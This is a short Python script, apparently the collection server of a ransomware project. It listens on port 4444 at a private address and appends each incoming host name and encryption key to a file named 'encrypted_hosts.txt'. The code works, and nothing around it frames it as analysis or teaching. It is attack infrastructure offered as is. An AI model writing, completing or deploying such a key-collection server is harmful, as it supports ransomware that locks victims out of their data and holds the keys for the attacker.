import socket

IP_ADDDRES = '192.168.200.109'
PORT = 4444

print('Creating Scoket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDDRES, PORT))
    print('Listennig for connections...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connecction from {addr} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
